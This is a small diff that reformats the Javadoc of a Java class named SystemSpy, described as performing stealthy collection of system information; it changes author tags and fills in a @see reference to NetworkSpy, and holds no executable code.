@@ -30,11 +30,10 @@ import lombok.Data;
 
 /**
  * This class realizes the runnable performing the stealthy collection of system information.
- *
- * @author Giacomo Marciani <gmarciani@ieee.org>
- * @author Michele Porretta <mporretta@acm.org>
+ * @author Giacomo Marciani {@literal <gmarciani@ieee.org>}
+ * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0.0
- * @see
+ * @see NetworkSpy
  */
 @Data
 public class SystemSpy implements Runnable {
